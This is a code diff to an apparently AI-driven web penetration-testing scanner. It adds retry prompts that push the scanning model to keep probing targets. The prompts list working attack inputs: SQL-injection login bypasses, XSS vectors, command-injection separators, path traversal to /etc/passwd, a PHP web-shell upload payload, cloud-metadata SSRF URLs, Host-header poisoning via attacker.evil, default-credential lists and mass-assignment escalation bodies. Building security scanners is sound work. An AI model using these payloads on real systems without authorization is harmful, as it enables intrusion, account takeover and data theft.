@@ -1464,14 +1464,14 @@ async def run_scan(
             if phase.id == "attack_chain_analysis" and findings:
                 summary_lines = []
                 for i, f in enumerate(findings, 1):
-                    line = f"{i}. [{f.get('severity','?')}] {f.get('title','?')} @ {f.get('url','?')}"
-                    param = f.get("parameter", "")
-                    pl = f.get("payload", "")
+                    line = f"{i}. [{_s(f.get('severity','?'))}] {_s(f.get('title','?'))} @ {_s(f.get('url','?'))}"
+                    param = _s(f.get("parameter", ""))
+                    pl = _s(f.get("payload", ""))
                     if param:
                         line += f" [param: {param}]"
                     if pl:
                         line += f" [payload: {pl[:100]}]"
-                    ev = f.get("evidence", "")
+                    ev = _s(f.get("evidence", ""))
                     if ev:
                         line += f" — {ev[:200]}"
                     summary_lines.append(line)
@@ -1767,35 +1767,480 @@ async def run_scan(
 
             phase_new_findings = len(findings) - phase_findings_before
 
-            # ── Phase Retry: if key injection phase found 0, retry with analysis ──
-            _RETRY_PHASES = {"web_a03_sqli", "web_a03_xss", "web_a03_cmdi",
-                            "web_a03_ssti", "web_a03_path_traversal", "web_a03_xxe",
-                            "web_a01", "web_a07", "web_a10",
-                            "api_injection", "api_ssrf", "api_authz"}
-            if (phase.id in _RETRY_PHASES
-                    and phase_new_findings == 0
+            # ── Post-phase recovery: active retry OR passive evidence summary ──
+            _ACTIVE_RETRY_PHASES = {
+                "web_a01", "web_a07", "web_a10",
+                "web_a03_sqli", "web_a03_xss", "web_a03_cmdi",
+                "web_a03_ssti", "web_a03_path_traversal", "web_a03_xxe",
+                "api_injection", "api_ssrf", "api_authz",
+                "api_auth", "web_bfla", "api_bfla",
+                "web_file_upload", "web_password_reset", "web_session_mgmt",
+                "api_mass_assign", "api_data_exposure",
+            }
+            _RETRY_PROMPTS = {
+                "access_control": (
+                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
+                    "Review your test results below and try DIFFERENT approaches:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY:\n"
+                    "1. Forced browsing: /admin, /admin/users, /api/admin, /internal, /debug, "
+                    "/manage, /dashboard, /settings, /actuator, /api/v1/users\n"
+                    "2. Case-sensitivity routing bypass — for EVERY endpoint that returned 403/401 "
+                    "with the lowercase path (e.g. /api/users), re-send the SAME request with "
+                    "these case variants — Spring Security, some WAFs and reverse proxies "
+                    "match paths case-sensitively while the MVC router does not, causing the "
+                    "auth layer to be skipped:\n"
+                    "   /API/users, /Api/users, /aPI/users, /API/admin/users, /API/organizations\n"
+                    "   /API/licenses, /API/invoices, /API/billing, /API/internal\n"
+                    "Also try trailing-slash / path-normalization variants: /api/users/, "
+                    "/api/users/./, /api/users/..;/, /api/users;/, /api/users%2f, "
+                    "/api/users%2e, /.;/api/users, /api//users. A 200 on any of these when the "
+                    "canonical path returned 403 is Critical 'Access Control Bypass via Path "
+                    "Normalization / Case Sensitivity'.\n"
+                    "3. IDOR: change numeric IDs (id-1, id+1, id=0), try UUIDs, access other users' resources. "
+                    "If you find ONE IDOR on a resource, SWEEP the same pattern across EVERY other "
+                    "resource endpoint you know of: if /api/users/{{id}} is IDOR, immediately "
+                    "test /api/organizations/{{id}}, /api/invoices/{{id}}, /api/licenses/{{id}}, "
+                    "/api/subscriptions/{{id}}, /api/billing/{{id}}, /api/orders/{{id}}, "
+                    "/api/documents/{{id}} with the same technique. Each one that leaks another "
+                    "tenant's data is a separate finding.\n"
+                    "4. Cross-role / BFLA re-test — if the auth phase obtained MULTIPLE tokens "
+                    "(admin + non-admin), for EVERY admin-only endpoint that returned 200 with "
+                    "the admin token, re-send the same request with each non-admin token. A 200 "
+                    "on a low-priv token where the endpoint is documented/intended as admin-only "
+                    "is 'Broken Function Level Authorization — <role> can access <endpoint>' "
+                    "(High/Critical). Also test the reverse: unauthenticated requests to "
+                    "endpoints only tested with tokens — 200 without auth = 'Missing "
+                    "Authentication'.\n"
+                    "5. Method tampering: GET→POST, POST→PUT, GET→DELETE on sensitive endpoints. "
+                    "Also test HTTP verbs the framework may tunnel: X-HTTP-Method-Override: "
+                    "DELETE, _method=DELETE body param.\n"
+                    "6. Parameter pollution: add ?admin=true, ?role=admin, ?debug=1, "
+                    "?isAdmin=1, ?bypass=true, ?internal=1\n"
+                    "7. Try endpoints you haven't tested yet\n"
+                    "DO NOT give up. Try at least 3 more approaches."
+                ),
+                "auth": (
+                    "RETRY — Phase '{name}' has NOT completed credential testing yet. "
+                    "Review the evidence below and perform credential discovery now:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY (use api_request to POST directly to the login endpoint(s), "
+                    "NOT inject_payload — many apps only validate via JSON/REST):\n"
+                    "1. Default credentials — try EACH of these pairs:\n"
+                    "   admin:admin, admin:password, admin:admin123, admin:123456,\n"
+                    "   administrator:administrator, root:root, test:test, guest:guest, user:user\n"
+                    "2. Email-format usernames — try BOTH admin AND non-admin tenant roles. "
+                    "Finding a non-admin credential is as valuable as finding admin, because a "
+                    "low-priv token is required to prove BFLA/horizontal escalation later:\n"
+                    "   Admin-style:   admin@<target-host>:admin123, admin@<target-host>:password,\n"
+                    "                  admin@juice-sh.op:admin123, administrator@<target>:password\n"
+                    "   Tenant/role:   owner@<target>:password, owner@acme.com:password,\n"
+                    "                  customer@<target>:password, manager@<target>:password,\n"
+                    "                  member@<target>:password, staff@<target>:password,\n"
+                    "                  billing@<target>:password, finance@<target>:password,\n"
+                    "                  support@<target>:password, user@<target>:password,\n"
+                    "                  licops@<target>:password, operator@<target>:password\n"
+                    "   Generic:       test@test.com:test123, admin@example.com:password,\n"
+                    "                  demo@demo.com:demo, guest@example.com:guest\n"
+                    "   Replace <target-host> with the actual hostname you see in the target URL "
+                    "(e.g. if the target is https://resurp.com, try owner@resurp.com, "
+                    "customer@resurp.com, etc.). App-specific prefixes you see in JS bundles or "
+                    "error messages are high-value guesses.\n"
+                    "   IMPORTANT — DO NOT stop after finding ONE working credential. Keep trying "
+                    "until you obtain tokens for AT LEAST 2 different roles (one admin + one "
+                    "non-admin if possible). Multi-role tokens enable the BFLA cross-role "
+                    "re-test in the access-control phase.\n"
+                    "3. Parameter-name permutation — if the documented field (e.g. `email`) "
+                    "returns a validation error (400 / 'invalid email') on SQLi payloads, RE-SEND "
+                    "the SAME payload using alternate identifier names on the SAME endpoint — the "
+                    "backend framework often silently accepts them:\n"
+                    "   {{\"username\":\"admin' --\",\"password\":\"x\"}}\n"
+                    "   {{\"user\":\"admin' --\",\"password\":\"x\"}}\n"
+                    "   {{\"login\":\"admin' --\",\"password\":\"x\"}}\n"
+                    "   {{\"identifier\":\"admin' --\",\"password\":\"x\"}}\n"
+                    "   {{\"user_id\":\"1 OR 1=1\",\"password\":\"x\"}}\n"
+                    "   {{\"account\":\"admin' --\",\"password\":\"x\"}}\n"
+                    "4. SQL injection auth bypass in the email/username field:\n"
+                    "   {{\"email\":\"admin' --\",\"password\":\"x\"}}\n"
+                    "   {{\"email\":\"' OR 1=1 --\",\"password\":\"x\"}}\n"
+                    "   {{\"username\":\"\\\" OR \\\"1\\\"=\\\"1\",\"password\":\"x\"}}\n"
+                    "5. Token manipulation: remove Authorization header, invalid token, JWT alg:none\n"
+                    "6. Brute force resistance: send 5+ rapid wrong-password attempts, check for lockout\n\n"
+                    "A successful login (200 + token/session returned) with a guessed password MUST\n"
+                    "be reported as 'Default Credentials Accepted: <user>:<pass>' (High severity).\n"
+                    "A successful SQLi bypass MUST be reported as 'SQL Injection Authentication\n"
+                    "Bypass' (Critical severity). DO NOT give up before testing at least 10 credential pairs."
+                ),
+                "sqli": (
+                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
+                    "Review your test results below and try DIFFERENT approaches:\n\n"
+                    "{evidence}\n\n"
+                    "CRITICAL — PARAMETER-NAME PERMUTATION:\n"
+                    "If your SQLi payloads on the documented params returned VALIDATION-STYLE "
+                    "rejections (400 Bad Request, 'IllegalArgumentException', 'Invalid or used X', "
+                    "schema / type errors) rather than a SQL error or a successful query, the "
+                    "documented param is GATED by validation BEFORE reaching the DB — but the "
+                    "backend framework (Spring / Express / Flask) will often silently accept "
+                    "OTHER param names on the SAME endpoint that flow STRAIGHT to a SQL query.\n"
+                    "YOU MUST re-send the SAME payload to the SAME endpoint with these alternate "
+                    "names BEFORE concluding the endpoint is safe:\n"
+                    "  • identifier fields:  email, username, user, login, account, user_id, id\n"
+                    "  • lookup fields:      q, query, search, name, value, key, filter\n"
+                    "  • password-reset specifically: try email AND username AND user_id as the\n"
+                    "    subject field, even if the UI only sends `token` + `password`.\n"
+                    "A DIFFERENT response signature on an alternate name (500 with SQL error, 200 "
+                    "success, different body snippet) is a STRONG signal — pivot and fuzz that "
+                    "param with SQLi payloads.\n\n"
+                    "YOU MUST ALSO TRY:\n"
+                    "1. Use baseline_value with fuzz_parameter — without it, payloads like ' won't "
+                    "trigger errors in SQL LIKE clauses. Set baseline_value='test'\n"
+                    "2. Try DB-specific blind payloads: SLEEP(5), pg_sleep(5), WAITFOR DELAY\n"
+                    "3. Try UNION-based: ' UNION SELECT NULL-- with increasing NULLs\n"
+                    "4. Try api_request with manually crafted SQL payloads in URL params and body\n"
+                    "5. Test DIFFERENT endpoints you haven't tried (login, search, profile, API)\n"
+                    "6. Look at error messages for DB type hints (PostgreSQL, MySQL, SQLite, MSSQL)\n"
+                    "DO NOT give up. Try at least 3 more approaches AND the param-name permutation "
+                    "above on any endpoint that returned a validation-style rejection."
+                ),
+                "xss": (
+                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
+                    "Review your test results below and try DIFFERENT approaches:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY:\n"
+                    "1. Test ALL reflection points: search boxes, URL params, form fields, headers\n"
+                    "2. Parameter-name permutation — if the documented param doesn't reflect, "
+                    "re-send the payload with these alternate names that backends commonly accept "
+                    "on the same endpoint: q, query, search, s, keyword, term, name, value, "
+                    "text, msg, message, comment, title, desc, description, returnTo, next, "
+                    "redirect, url, callback, debug. A NEW reflection on an alternate name = XSS.\n"
+                    "3. Try different encodings: URL-encode, double-encode, HTML entities\n"
+                    "4. Try event handlers: <img src=x onerror=alert(1)>, <svg onload=alert(1)>\n"
+                    "5. Try DOM-based: check if URL fragments/params are written to innerHTML\n"
+                    "6. Try CSP bypass if CSP is present: use existing trusted domains\n"
+                    "DO NOT give up. Try at least 3 more approaches."
+                ),
+                "injection": (
+                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
+                    "Review your test results below and try DIFFERENT approaches:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY:\n"
+                    "1. Different separators: ;, |, &&, ||, `, $(), %0a for command injection\n"
+                    "2. Blind techniques: sleep/ping for CMDI, {{7*7}} for SSTI, "
+                    "../../etc/passwd for path traversal\n"
+                    "3. Parameter-name permutation — for path traversal / LFI / file-read, if the "
+                    "documented param returns 'invalid path' / 400, re-send the SAME payload with "
+                    "alternate names backends commonly accept: file, path, name, filename, doc, "
+                    "document, page, template, view, load, include, read, src, source, asset, "
+                    "resource, href. For SSTI/CMDI, try: name, template, view, cmd, command, "
+                    "exec, eval, q, input, data. A different response signature on an alternate "
+                    "name is a strong signal.\n"
+                    "4. Different template engines: Jinja2, Twig, Freemarker, Handlebars\n"
+                    "5. Different file targets: /etc/passwd, /etc/hosts, C:\\Windows\\win.ini\n"
+                    "6. Try inputs you haven't tested and different encoding/bypass techniques\n"
+                    "DO NOT give up. Try at least 3 more approaches."
+                ),
+                "ssrf": (
+                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
+                    "Review your test results below and try DIFFERENT approaches:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY:\n"
+                    "1. Cloud metadata: http://169.254.169.254/latest/meta-data/\n"
+                    "2. Internal probing: http://localhost, http://127.0.0.1, http://[::1]\n"
+                    "3. URL params you haven't tested: ?url=, ?redirect=, ?callback=, ?next=\n"
+                    "4. Redirect chains: use your own URL that 302-redirects to internal targets\n"
+                    "5. Different URL schemes: file://, gopher://, dict://\n"
+                    "DO NOT give up. Try at least 3 more approaches."
+                ),
+                "file_upload": (
+                    "RETRY — Phase '{name}' has not proven RCE via file upload. "
+                    "Review the evidence below and actually exploit the upload:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY (use api_request or form submission — then fetch the "
+                    "uploaded file back with navigate/api_request and inspect the response):\n"
+                    "1. Executable extensions: upload .php / .asp / .aspx / .jsp / .jspx / "
+                    ".cgi / .pl / .py with benign content and try to hit the returned URL. "
+                    "If the server executes it, that's CRITICAL RCE.\n"
+                    "2. Double-extension & null-byte bypass: shell.php.jpg, shell.asp;.jpg, "
+                    "shell.php%00.jpg, shell.phtml, shell.phar — MIME-check bypass is weak.\n"
+                    "3. Content-Type confusion: send Content-Type: image/jpeg but payload is "
+                    "<?php system($_GET['c']); ?> — verify execution by fetching ?c=id.\n"
+                    "4. Polyglot files: valid PNG/JPEG header + trailing PHP payload; SVG "
+                    "with embedded <script>/<foreignObject> for stored XSS.\n"
+                    "5. Path traversal in filename: ../../../var/www/html/shell.php, "
+                    "..\\..\\webroot\\shell.aspx — can you overwrite files outside the upload dir?\n"
+                    "6. Oversized / zip-bomb / nested archive to probe DoS & unsafe unzip.\n"
+                    "REPORT: on confirmed execution, emit 'Arbitrary File Upload → RCE' "
+                    "(Critical). DO NOT settle for 'upload accepted' without proving execution."
+                ),
+                "password_reset": (
+                    "RETRY — Phase '{name}' has not completed password-reset abuse testing. "
+                    "Review the evidence below and test every class below:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY (use only the scan's own email; never hit third-party addresses):\n"
+                    "1. Account enumeration: diff the response (body, status, size, timing) "
+                    "between a known-valid email and a random one. Any visible diff = enumeration.\n"
+                    "2. Host-header poisoning: resend the reset request with "
+                    "Host: attacker.evil and X-Forwarded-Host: attacker.evil — if a reset "
+                    "link or body comes back referencing attacker.evil, that's account takeover.\n"
+                    "3. Token entropy / reuse / expiry: capture a token, request another reset "
+                    "and check if the old one still works (no invalidation = bad). Inspect token "
+                    "length, charset, predictability.\n"
+                    "4. Missing old-password check on the reset completion endpoint — can you "
+                    "POST a new password to the reset endpoint without the token, or with a "
+                    "guessed/expired token?\n"
+                    "5. Parameter-name permutation & SQLi on EVERY identifier field — the UI "
+                    "usually sends only {{token, password}} or {{email}}, but the backend often "
+                    "accepts MORE fields that flow directly into SQL. For each reset endpoint "
+                    "(forgot-password AND reset-password), send each of these as a SEPARATE "
+                    "request and watch for 5xx / SQL errors / timing differences:\n"
+                    "   {{\"email\":\"' OR 1=1--\"}}\n"
+                    "   {{\"username\":\"' OR 1=1--\"}}\n"
+                    "   {{\"user\":\"' OR 1=1--\"}}\n"
+                    "   {{\"login\":\"' OR 1=1--\"}}\n"
+                    "   {{\"identifier\":\"' OR 1=1--\"}}\n"
+                    "   {{\"user_id\":\"1 OR 1=1\"}}\n"
+                    "   {{\"email\":\"' AND SLEEP(5)--\"}}\n"
+                    "   {{\"token\":\"' OR 1=1--\"}}\n"
+                    "A 500 / SQL error / >3s response on ANY of these = 'SQL Injection in Password "
+                    "Reset <field> Parameter' (Critical). Validation-style rejections "
+                    "(IllegalArgumentException / 400 'invalid email') on one field do NOT imply the "
+                    "other fields are safe — test each independently.\n"
+                    "6. Parameter pollution / JSON smuggling: {{\"email\":[\"victim@x\", \"attacker@y\"]}} "
+                    "or CR/LF injection in the email field to split the recipient.\n"
+                    "7. Race condition: send 2 reset requests concurrently and see whether both "
+                    "tokens validate.\n"
+                    "REPORT host-header takeover as 'Password Reset Host Header Injection' "
+                    "(High), token reuse as 'Password Reset Token Not Invalidated' (High), "
+                    "SQLi in any identifier field as 'SQL Injection in Password Reset' (Critical)."
+                ),
+                "session_mgmt": (
+                    "RETRY — Phase '{name}' has not proven a session-management defect. "
+                    "Review the evidence and test each class below with get_cookies / api_request:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY:\n"
+                    "1. Session fixation: get the session cookie BEFORE login, log in, get it "
+                    "AFTER login, compare. Same value = fixation (High).\n"
+                    "2. Cookie flags: for every session/auth cookie, verify HttpOnly, Secure "
+                    "and SameSite. Missing flags on an auth cookie are each separate findings.\n"
+                    "3. Session in URL: check whether the token appears in any query string, "
+                    "fragment, or Location header — leaks via Referer & logs.\n"
+                    "4. Logout / privilege change invalidation: change password (or role, if "
+                    "possible) and verify the PREVIOUS token stops working. If it still works, "
+                    "that's 'Session Not Invalidated on Credential Change' (High).\n"
+                    "5. Concurrent-session / token reuse: a stolen token should not survive "
+                    "logout — test it. Long-lived JWTs with no exp claim are a finding.\n"
+                    "6. Entropy & predictability: assess token length and charset; extremely "
+                    "short or sequential tokens are brute-forceable.\n"
+                    "DO NOT click the logout button. Inspect via get_cookies, "
+                    "get_local_storage and api_request only."
+                ),
+                "mass_assign": (
+                    "RETRY — Phase '{name}' has not confirmed mass assignment. "
+                    "Review the evidence and do not stop at 'request accepted' — you must "
+                    "GET the resource back and prove the privileged field was persisted:\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY (use api_request for every POST/PUT/PATCH):\n"
+                    "1. Privilege escalation fields: inject {{\"role\":\"admin\"}}, "
+                    "{{\"isAdmin\":true}}, {{\"admin\":1}}, {{\"permissions\":[\"*\"]}}, "
+                    "{{\"userType\":\"admin\"}}, {{\"is_staff\":true}} into user-create / "
+                    "user-update / register bodies, then GET the resource and confirm.\n"
+                    "2. Financial fields: {{\"price\":0}}, {{\"discount\":100}}, "
+                    "{{\"balance\":999999}}, {{\"credits\":999999}}, {{\"isPaid\":true}} "
+                    "on order/payment/product endpoints.\n"
+                    "3. State fields: {{\"verified\":true}}, {{\"active\":true}}, "
+                    "{{\"emailVerified\":true}}, {{\"kycStatus\":\"approved\"}}.\n"
+                    "4. Ownership takeover: {{\"ownerId\":<other-user>}}, "
+                    "{{\"userId\":<other-user>}}, {{\"email\":\"attacker@x\"}}.\n"
+                    "5. Schema inference: GET a resource, copy every field name from the "
+                    "response, and send them all back in the update body — this often "
+                    "surfaces read-only fields the API silently accepts.\n"
+                    "REPORT as 'Mass Assignment — Privilege Escalation to admin' (Critical) "
+                    "or 'Mass Assignment — Price Tampering' (High) with before/after JSON proof."
+                ),
+                "data_exposure": (
+                    "RETRY — Phase '{name}' has not enumerated excessive data exposure. "
+                    "Review the evidence and go deeper — don't stop at 'response looks normal':\n\n"
+                    "{evidence}\n\n"
+                    "YOU MUST TRY:\n"
+                    "1. UI-vs-API diff: for profile/orders/settings, compare what the UI renders "
+                    "to what the API returns. Every extra field (password_hash, salt, "
+                    "internal_id, ssn, phone, 2fa_secret, apiKey, stripe_customer_id) is a finding.\n"
+                    "2. List/search endpoints: /api/users, /api/users?limit=1000, "
+                    "/api/search?q=*, /api/admin/users — do unauthenticated or low-priv roles "
+                    "retrieve other users' PII?\n"
+                    "3. Sensitive-field probe: scan every JSON response you've collected for "
+                    "'password', 'hash', 'salt', 'token', 'secret', 'api_key', 'private_key', "
+                    "'ssn', 'credit_card', 'cvv', 'pin', 'otp'. Any hit = finding.\n"
+                    "4. Verbose errors: trigger errors (bad JSON, missing fields, bad types) "
+                    "and capture stack traces, SQL snippets, file paths, hostnames.\n"
+                    "5. Debug/introspection endpoints: /api/debug, /actuator/*, /graphql "
+                    "with IntrospectionQuery, /api/swagger, /api/openapi — do they leak internal "
+                    "schema or config?\n"
+                    "6. ID enumeration: for every endpoint that takes an id, sweep a small "
+                    "range (id-5 … id+5) and diff the responses — leaking other users' data is "
+                    "both BOLA and data exposure.\n"
+                    "REPORT each leaked sensitive field/endpoint as its own finding with the "
+                    "offending response body as evidence."
+                ),
+            }
+            _PHASE_TO_PROMPT_KEY = {
+                "web_a01": "access_control", "api_authz": "access_control",
+                "web_bfla": "access_control", "api_bfla": "access_control",
+                "web_a07": "auth", "api_auth": "auth",
+                "web_a03_sqli": "sqli", "api_injection": "sqli",
+                "web_a03_xss": "xss",
+                "web_a03_cmdi": "injection", "web_a03_ssti": "injection",
+                "web_a03_path_traversal": "injection", "web_a03_xxe": "injection",
+                "web_a10": "ssrf", "api_ssrf": "ssrf",
+                "web_file_upload": "file_upload",
+                "web_password_reset": "password_reset",
+                "web_session_mgmt": "session_mgmt",
+                "api_mass_assign": "mass_assign",
+                "api_data_exposure": "data_exposure",
+            }
+
+            _PHASE_CORE_KEYWORDS: dict[str, tuple[str, ...]] = {
+                "web_a07": (
+                    "default credential", "weak password", "credential stuffing",
+                    "brute force successful", "admin:admin", "login bypass",
+                    "authentication bypass", "auth bypass", "cracked password",
+                    "sql injection authentication", "valid credentials",
+                    "default password", "credentials accepted",
+                ),
+                "api_auth": (
+                    "default credential", "weak password", "credential stuffing",
+                    "brute force successful", "admin:admin", "login bypass",
+                    "authentication bypass", "auth bypass", "valid credentials",
+                    "default password", "credentials accepted", "broken token",
+                    "jwt alg", "jwt none", "missing authentication",
+                ),
+                "web_a01": (
+                    "broken access", "access control", "forced browsing", "idor",
+                    "authorization bypass", "privilege escalation", "admin panel",
+                    "horizontal escalation", "vertical escalation", "role bypass",
+                    "method tampering", "parameter pollution",
+                ),
+                "api_authz": (
+                    "bola", "broken object level", "idor", "authorization bypass",
+                    "horizontal escalation", "vertical escalation", "access control",
+                    "role bypass", "privilege escalation",
+                ),
+                "web_bfla": (
+                    "bfla", "broken function level", "function level authorization",
+                    "privilege escalation", "role bypass", "admin function",
+                ),
+                "api_bfla": (
+                    "bfla", "broken function level", "function level authorization",
+                    "privilege escalation", "role bypass", "admin endpoint",
+                ),
+                "web_a03_sqli": (
+                    "sql injection", "sqli", "blind sql", "union-based",
+                    "boolean-based", "time-based sql", "error-based sql",
+                ),
+                "web_a03_xss": (
+                    "xss", "cross-site scripting", "reflected script",
+                    "stored script", "dom-based xss", "script injection",
+                ),
+                "web_a03_cmdi": (
+                    "command injection", "os command", "shell injection",
+                    "remote code execution", "rce",
+                ),
+                "web_a03_ssti": (
+                    "template injection", "ssti", "server-side template",
+                ),
+                "web_a03_path_traversal": (
+                    "path traversal", "directory traversal", "lfi",
+                    "local file inclusion", "arbitrary file read",
+                ),
+                "web_a03_xxe": (
+                    "xxe", "xml external entity", "external entity",
+                ),
+                "api_injection": (
+                    "sql injection", "sqli", "command injection",
+                    "xss", "cross-site scripting", "template injection",
+                    "xxe", "path traversal", "nosql injection", "ldap injection",
+                ),
+                "web_a10": (
+                    "ssrf", "server-side request forgery", "internal network",
+                    "cloud metadata", "169.254.169.254",
+                ),
+                "api_ssrf": (
+                    "ssrf", "server-side request forgery", "internal network",
+                    "cloud metadata", "169.254.169.254",
+                ),
+                "web_file_upload": (
+                    "arbitrary file upload", "unrestricted file upload",
+                    "file upload rce", "remote code execution", "rce via upload",
+                    "webshell", "web shell", "php shell", "jsp shell",
+                    "executable upload", "double extension",
+                ),
+                "web_password_reset": (
+                    "password reset host header", "host header injection",
+                    "account takeover", "reset token reuse", "reset token not invalidated",
+                    "predictable reset token", "account enumeration",
+                    "password reset poisoning", "missing old password",
+                ),
+                "web_session_mgmt": (
+                    "session fixation", "session not invalidated",
+                    "session token in url", "missing httponly", "missing secure flag",
+                    "missing samesite", "insecure cookie", "session reuse",
+                    "long-lived session", "predictable session",
+                ),
+                "api_mass_assign": (
+                    "mass assignment", "privilege escalation to admin",
+                    "role=admin", "isadmin", "price tampering",
+                    "ownership takeover", "parameter tampering escalation",
+                    "unauthorized field modification",
+                ),
+                "api_data_exposure": (
+                    "excessive data exposure", "sensitive data exposure",
+                    "pii leak", "password hash in response", "api key in response",
+                    "secret in response", "verbose error", "stack trace exposed",
+                    "debug endpoint", "internal id leak", "internal field leak",
+                    "unfiltered list endpoint",
+                ),
+            }
+
+            def _phase_has_core_finding() -> bool:
+                keywords = _PHASE_CORE_KEYWORDS.get(phase.id)
+                if not keywords:
+                    return phase_new_findings > 0
+                for f in findings[phase_findings_before:]:
+                    text = (
+                        (f.get("title") or "") + " "
+                        + (f.get("description") or "") + " "
+                        + (f.get("vulnerability_type") or "") + " "
+                        + (f.get("category") or "")
+                    ).lower()
+                    if any(kw in text for kw in keywords):
+                        return True
+                return False
+
+            _core_class_missing = (
+                phase.id in _PHASE_CORE_KEYWORDS
+                and not _phase_has_core_finding()
+                and phase_evidence
+            )
+
+            if (phase.id in _ACTIVE_RETRY_PHASES
+                    and (phase_new_findings == 0 or _core_class_missing)
                     and phase_evidence
                     and not getattr(phase, "_retried", False)):
                 phase._retried = True
                 evidence_text = _format_evidence_buffer(phase_evidence)
-                retry_prompt = (
-                    f"RETRY — Phase '{phase.name}' found 0 vulnerabilities. "
-                    "Review your test results below and try a DIFFERENT approach:\n\n"
-                    f"{evidence_text}\n\n"
-                    "ANALYSIS REQUIRED:\n"
-                    "1. Look at which endpoints you tested and their responses\n"
-                    "2. Did you get any status 500, error messages, or anomalies? Those indicate injection worked.\n"
-                    "3. Did you use baseline_value with fuzz_parameter? Without it, payloads like ' won't "
-                    "trigger errors in SQL LIKE '%input%' clauses. Set baseline_value='test' so "
-                    "the actual value sent is 'test' + payload (e.g. q=test').\n"
-                    "4. Try DIFFERENT endpoints you haven't tested yet\n"
-                    "5. Try api_request with the full URL and payload manually constructed\n"
-                    "6. Try inject_payload on any form fields (login username, search box)\n\n"
-                    "DO NOT give up. Try at least 3 more approaches before concluding."
+                prompt_key = _PHASE_TO_PROMPT_KEY.get(phase.id, "injection")
+                retry_prompt = _RETRY_PROMPTS[prompt_key].format(
+                    name=phase.name, evidence=evidence_text
                 )
-                logger.info("Phase %s: 0 findings with %d evidence records, running retry pass",
-                            phase.name, len(phase_evidence))
-                print(f" [RETRY] {phase.name}: 0 findings, retrying with evidence analysis...")
+                _retry_reason = (
+                    "zero findings" if phase_new_findings == 0
+                    else "no core-class finding"
+                )
+                logger.info(
+                    "Phase %s: retry triggered (%s) with %d evidence records",
+                    phase.name, _retry_reason, len(phase_evidence),
+                )
+                print(f" [RETRY] {phase.name}: {_retry_reason}, retrying with tool calls...")
                 _cb("phase_start", {"phase": phase_num, "total": total_phases,
                                     "name": f"{phase.name} (retry)", "id": f"{phase.id}_retry"})
                 messages.append({"role": "user", "content": retry_prompt})
@@ -1840,7 +2285,7 @@ async def run_scan(
                                 args_parsed = {"raw": fn_args}
                             resp_summary = {
                                 k: v for k, v in result.items()
-                                if k in ("status", "url", "error", "reflected", "anomaly", "body_snippet", "results", "title")
+                                if k in ("status", "url", "error", "reflected", "anomaly", "body_snippet", "results", "accessible", "title", "forms")
                             } if isinstance(result, dict) else str(result)[:200]
                             _cb("tool_call", {
                                 "phase": f"{phase.name} (retry)",
@@ -1883,6 +2328,40 @@ async def run_scan(
                 print(f" [RETRY] {retry_tool_calls} tool calls, {retry_new} findings")
                 _cb("phase_end", {"phase": phase_num, "name": f"{phase.name} (retry)",
                                   "tool_calls": retry_tool_calls, "findings": retry_new})
+
+            elif phase_new_findings == 0 and phase_evidence:
+                summary_prompt = (
+                    f"Phase '{phase.name}' completed with 0 vulnerabilities reported, "
+                    "but you performed security tests. Review the evidence below and "
+                    "output ANY confirmed vulnerabilities as JSON findings.\n\n"
+                    + _format_evidence_buffer(phase_evidence)
+                )
+                messages.append({"role": "user", "content": summary_prompt})
+                try:
+                    _check_cancel()
+                    summary_resp = router.complete(
+                        model=model, messages=messages, tools=[],
+                        cancel_flag=cancel_flag,
+                    )
+                    if summary_resp and getattr(summary_resp, "choices", None):
+                        summary_f = extract_findings(
+                            str(summary_resp.choices[0].message.content or "")
+                        )
+                        if summary_f:
+                            findings.extend(summary_f)
+                            for f in summary_f:
+                                f["phase"] = phase.name
+                                _match_evidence_to_finding(f, phase_evidence)
+                                _cb("finding", f)
+                            phase_new_findings += len(summary_f)
+                            logger.info(
+                                "Phase %s: evidence summary recovered %d findings",
+                                phase.name, len(summary_f),
+                            )
+                except ScanCancelled:
+                    raise
+                except Exception as e:
+                    logger.warning("Evidence summary failed for %s: %s", phase.name, e)
 
             metrics["phases_completed"] += 1
             metrics["phase_log"].append({
